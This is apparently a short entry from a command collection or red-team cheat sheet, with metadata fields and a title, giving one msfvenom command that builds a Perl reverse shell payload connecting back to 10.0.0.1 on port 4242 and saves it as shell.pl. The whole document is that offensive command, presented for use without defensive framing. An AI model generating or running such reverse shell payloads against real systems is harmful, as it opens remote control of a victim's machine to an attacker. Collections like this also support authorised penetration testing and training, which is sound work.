---
id: 36bb8b4a-f6a9-4b59-9e72-bdc6f3e1d44b
name: Generate Perl Reverse Shell Payload
type: command
executor: bash
data: $ msfvenom -p cmd/unix/reverse_perl LHOST="10.0.0.1" LPORT=4242 -f raw > shell.pl
output: null
created_at: '2023-04-06T03:56:24.923833+00:00'
updated_at: '2023-04-10T20:25:33.111197+00:00'
---

# Generate Perl Reverse Shell Payload

```bash
$ msfvenom -p cmd/unix/reverse_perl LHOST="10.0.0.1" LPORT=4242 -f raw > shell.pl
```


